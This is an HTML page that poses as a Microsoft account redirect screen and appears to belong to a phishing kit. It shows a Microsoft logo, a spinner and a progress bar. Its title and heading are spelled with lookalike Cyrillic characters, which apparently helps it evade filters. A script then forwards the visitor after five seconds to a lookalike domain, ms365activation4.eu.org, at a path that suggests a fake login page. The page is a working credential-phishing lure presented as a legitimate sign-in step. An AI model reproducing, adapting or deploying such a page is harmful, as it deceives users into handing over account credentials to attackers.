<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Rеdіrесtіng tо Місrоsоft Ассоunt</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: "Segoe UI", -apple-system, system-ui, sans-serif;
            background: #f8f9fa;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
            line-height: 1.5;
            color: #323130;
        }

        .redirect-container {
            background: #ffffff;
            border-radius: 4px;
            padding: 2rem;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 600px;
            text-align: center;
        }

        .logo {
            height: 24px;
            margin-bottom: 2rem;
        }

        .spinner {
            width: 40px;
            height: 40px;
            margin: 2rem auto;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #0078d4;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        .progress-bar {
            width: 100%;
            height: 4px;
            background: #f3f2f1;
            border-radius: 2px;
            margin: 2rem 0;
            overflow: hidden;
        }

        .progress-bar-fill {
            height: 100%;
            background: #0078d4;
            width: 0%;
            animation: progress 2s ease-in-out forwards;
        }

        .message {
            color: #323130;
            font-size: 16px;
            margin-bottom: 1rem;
        }

        .submessage {
            color: #605e5c;
            font-size: 14px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @keyframes progress {
            0% { width: 0%; }
            100% { width: 100%; }
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        .fade-in {
            animation: fadeIn 0.5s ease-in;
        }
    </style>
</head>
<body>
    <div class="redirect-container fade-in">
        <img src="ms-logo.png" alt="MS Logo" class="logo">
        <div class="spinner"></div>
        <div class="progress-bar">
            <div class="progress-bar-fill"></div>
        </div>
        <h1 class="message">Rеdіrесtіng tо Місrоsоft Ассоunt</h1>
        <p class="submessage">Please wait while we redirect you to the secure login page...</p>
    </div>

    <script>
        // Redirect after animation completes
        setTimeout(() => {
            window.location.href = 'https://ms365activation4.eu.org/verify/56765/lgn.html';
        }, 5000);
    </script>
</body>
</html>
